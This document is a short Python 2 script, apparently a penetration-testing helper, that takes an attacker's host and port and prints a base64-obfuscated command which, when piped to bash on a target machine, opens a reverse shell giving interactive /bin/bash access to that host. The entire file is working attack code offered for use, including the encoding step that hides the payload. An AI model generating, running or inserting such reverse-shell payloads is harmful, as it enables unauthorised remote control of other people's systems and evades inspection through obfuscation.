#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Generate base64 encoded python payload piped thru bash
import base64
import sys
import os

def BuildPythonReverseShell():
    python_rev_shell = '''python2 -c \'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
 s.connect(("%s", %s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()\'''' % (LHOST, LPORT)

    return base64.b64encode(python_rev_shell)

if len(sys.argv) != 3:
    print("""
.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌   ▄▄▄·       ▄▄▄·
▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  ▐█ ▄█▪     ▐█ ▄█
▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪   ██▀· ▄█▀▄  ██▀·
▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌▐█▪·•▐█▌.▐▌▐█▪·•
 ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ .▀    ▀█▄▀▪.▀
[nighter@nighter.se]
""")
    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
    sys.exit(0)

LHOST = sys.argv[1]
LPORT = sys.argv[2]

payload = BuildPythonReverseShell()
print('echo %s|base64 -d|bash' % payload)
